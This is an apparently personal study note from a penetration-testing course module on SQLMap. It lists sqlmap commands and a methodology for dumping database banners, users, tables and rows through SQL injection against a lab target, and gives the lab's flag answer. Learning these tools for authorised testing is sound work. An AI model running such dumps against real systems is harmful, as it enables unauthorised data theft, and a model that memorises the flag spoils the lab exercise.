# NOTE — Database Enumeration

## ID
403

## Module
SQLMap Essentials

## Kind
notes

## Title
Section 7 — Database Enumeration

## Description
Covers SQLMap's core database enumeration workflow — extracting banners, users, databases, tables, columns, and row data from a confirmed SQLi vulnerability using built-in switches.

## Tags
sqlmap, sqli, enumeration, dump, database, tables

## Commands
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --banner --current-user --current-db --is-dba --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --tables -D <DATABASE> --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --dump -T <TABLE> -D <DATABASE> --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --dump -T <TABLE> -D <DATABASE> -C <COL1>,<COL2> --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --dump -T <TABLE> -D <DATABASE> --start=<N> --stop=<M> --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --dump -T <TABLE> -D <DATABASE> --where="<CONDITION>" --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --dump-all --exclude-sysdbs --batch

## What This Section Covers
After confirming a SQLi vulnerability, enumeration is the next phase — systematically extracting database metadata and content. SQLMap uses pre-built queries from `queries.xml` for each DBMS, choosing between inband queries (for UNION/error-based SQLi) and blind queries (row-by-row extraction). This section walks through the full enumeration ladder: banner → user → database → tables → columns → rows.

## Methodology

1. **Confirm injection and gather basic info** — run the four recon switches together to get the DB version, current user, current database, and DBA status:
   `sqlmap -u 'http://<TARGET>:<PORT>/case1.php?id=1' --banner --current-user --current-db --is-dba --batch`

2. **List tables in the target database** — once you know the DB name (e.g., `testdb`), enumerate its tables:
   `sqlmap -u 'http://<TARGET>:<PORT>/case1.php?id=1' --tables -D testdb --batch`

3. **Dump a specific table** — target the table of interest (e.g., `flag1`) and extract all rows:
   `sqlmap -u 'http://<TARGET>:<PORT>/case1.php?id=1' --dump -T flag1 -D testdb --batch`

4. **Narrow columns** — if a table is wide, use `-C` to select only the columns you need:
   `sqlmap -u '...' --dump -T users -D testdb -C name,surname --batch`

5. **Narrow rows** — use `--start` and `--stop` to grab a row range, or `--where` for conditional filtering:
   `sqlmap -u '...' --dump -T users -D testdb --start=2 --stop=3 --batch`
   `sqlmap -u '...' --dump -T users -D testdb --where="name LIKE 'f%'" --batch`

6. **Full database dump** — skip `-T` to dump all tables in a DB, or use `--dump-all --exclude-sysdbs` for everything minus system databases.

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Contents of table flag1 in testdb (Case #1) | `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}` | `sqlmap -u 'http://<IP>:<PORT>/case1.php?id=1' -D testdb -T flag1 --batch --dump` — straightforward GET parameter injection on `id` |

## Key Takeaways
- Always start with `--banner --current-user --current-db --is-dba` to understand what you're working with before diving into table dumps.
- The `root` DB user does not mean OS root — it's the privileged DBMS user, which in modern setups has minimal filesystem access.
- SQLMap auto-selects inband vs blind queries based on the detected injection type — UNION/error-based uses fast inband retrieval, while blind goes row-by-row/bit-by-bit (much slower).
- Dumped data is saved locally as CSV by default — use `--dump-format` to switch to HTML or SQLite for easier offline analysis.
- `--exclude-sysdbs` is essential when using `--dump-all` to avoid pulling irrelevant system table data.

## Gotchas
- If SQLMap already detected the injection in a previous run, it skips detection and jumps straight to enumeration (uses the stored session). This is normal — not an error.
- Forgetting `-D` when using `--dump -T` will make SQLMap guess the database or prompt you — always specify it explicitly.
- Blind-based dumps on large tables can be extremely slow — narrow with `-C`, `--start/--stop`, or `--where` to avoid waiting forever.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|sqlmap-fundamentals]]  
← [[06-attack-tuning]] | [[08-advanced-enumeration]] →
<!-- AUTO-LINKS-END -->
